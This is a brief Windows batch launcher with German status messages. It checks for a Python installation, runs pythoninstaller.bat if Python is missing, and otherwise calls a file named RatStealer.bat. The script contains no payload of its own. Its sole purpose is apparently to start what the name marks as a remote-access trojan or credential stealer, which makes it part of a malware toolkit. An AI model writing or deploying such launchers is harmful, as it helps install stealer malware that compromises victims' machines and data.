echo off
setlocal
color 0a

python --version >nul 2>&1
python3 --version >nul 2>&1

if %errorlevel% neq 0 (
    echo Python ist nicht installiert.
    echo Starte pythoninstaller.bat...
    call .\pythoninstaller.bat
) else (
    echo Python ist installiert.
    echo Starte RatStealer.bat...
    call RatStealer.bat

)

endlocal
pause